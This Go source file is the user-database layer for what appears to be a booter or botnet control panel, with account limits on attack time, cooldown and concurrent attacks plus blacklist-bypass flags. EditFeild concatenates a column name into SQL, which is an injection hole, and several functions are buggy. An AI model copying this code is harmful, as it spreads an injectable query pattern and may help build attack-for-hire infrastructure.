package YamiDB

import (
	"database/sql"
	"time"
)


type User struct {
	ID			int

	Username		string
	Password		string

	NewUser        bool
	Admin		bool
	Reseller		bool
	Banned		bool
	Vip			bool

	MFA string


	MaxTime		int
	Cooldown		int
	Concurrents	int

	MaxSessions	int
	PowerSavingExempt bool
	BypassBlacklist bool


	PlanExpiry     int64

}


func Exists(user string) bool {
	Row, error := SQL.Query("SELECT `username` FROM `users` WHERE `username` = ?", user); if error != nil {
		return false
	}

	if !Row.Next() {
		return false
	}

	return true
}



func Auth(user, pass string) bool {
	pass = HashPassword(pass)
	Row, error := SQL.Query("SELECT `password` FROM `users` WHERE `username` = ? AND `password` = ?", user, pass); if error != nil {
		return false
	}

	if !Row.Next() {
		return false
	}

	return true
}



func GetUser(user string) (*User, error) {

	var Users User
	error := SQL.QueryRow("SELECT `ID`, `Username`, `MFA`, `NewUser`,`Admin`, `Reseller`, `Banned`, `Vip`, `MaxTime`, `Cooldown`, `Concurrents`, `MaxSessions`, `PowerSavingExempt`, `BypassBlacklist`, `PlanExpiry` FROM `users` WHERE `username` = ?", user).Scan(&Users.ID, &Users.Username, &Users.MFA, &Users.NewUser, &Users.Admin, &Users.Reseller, &Users.Banned, &Users.Vip, &Users.MaxTime, &Users.Cooldown, &Users.Concurrents, &Users.MaxSessions, &Users.PowerSavingExempt, &Users.BypassBlacklist, &Users.PlanExpiry); if error != nil {
		return nil, error
	}

	return &Users, nil
}



func RemoveUser(user string) bool {

	errors := SQL.QueryRow("DELETE FROM `users` WHERE `username` = ?", user); if errors != nil {
		return false
	}

	return true
}



// INSERT INTO `users` (`ID`, `Username`, `Password`, `MFA`, `NewUser`, `Admin`, `Reseller`, `Banned`, `Vip`, `MaxTime`, `Cooldown`, `Concurrents`, `MaxSessions`, `PowerSavingExempt`, `BypassBlacklist`, `PlanExpiry`) VALUES (NULL, ?, ?, '0', ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
func NewUser(Users *User) bool {
	error := SQL.QueryRow("INSERT INTO `users` (`ID`, `Username`, `Password`, `MFA`, `NewUser`, `Admin`, `Reseller`, `Banned`, `Vip`, `MaxTime`, `Cooldown`, `Concurrents`, `MaxSessions`, `PowerSavingExempt`, `BypassBlacklist`, `PlanExpiry`) VALUES (NULL, ?, ?, '0', ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);",
		Users.Username,
		HashPassword(Users.Password),
		Users.NewUser,
		Users.Admin,
		Users.Reseller,
		Users.Banned,
		Users.Vip,
		Users.MaxTime,
		Users.Cooldown,
		Users.Concurrents,
		Users.MaxSessions,
		Users.PowerSavingExempt,
		Users.BypassBlacklist,
		Users.PlanExpiry,
	); if error.Err() != nil {
		return false
	}

	return true
}



func AddDays(User string, Days int) bool {
	Users, error := GetUser(User); if error != nil {
		return false
	}

	End := time.Unix(Users.PlanExpiry, 0)

	lol := End.Add((time.Hour*24)*time.Duration(Days)).Unix()


	Row ,error := SQL.Query("update `users` set `PlanExpiry` = ? where username = ?", lol, User); if error != nil || Row.Err() != nil {
		return false
	}
	return true
}

func EditFeild(user, feild, replace string) bool {
	Row ,error := SQL.Query("update `users` set "+feild+" = ? where username = ?", replace, user); if error != nil || Row.Err() != nil {
		return false
	}

	return true
}

func GetUsers() ([]*User, error) {

	var users []*User
	rows, err := SQL.Query("SELECT `ID`, `Username`, `NewUser`,`Admin`, `Reseller`, `Banned`, `Vip`, `MaxTime`, `Cooldown`, `Concurrents`, `MaxSessions` FROM `users`")
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, nil
		}

		return users, err
	}

	defer rows.Close()

	for rows.Next() {
		user := &User{}
		if err := scanUsers(rows, user); err != nil {
			continue
		}

		users = append(users, user)
	}

	return users, nil
}

func scanUsers(row *sql.Rows, Users *User) error {

	return row.Scan(
		&Users.ID, 
		&Users.Username, 
		&Users.NewUser, 
		&Users.Admin, 
		&Users.Reseller, 
		&Users.Banned, 
		&Users.Vip, 
		&Users.MaxTime, 
		&Users.Cooldown, 
		&Users.Concurrents, 
		&Users.MaxSessions,
	)
}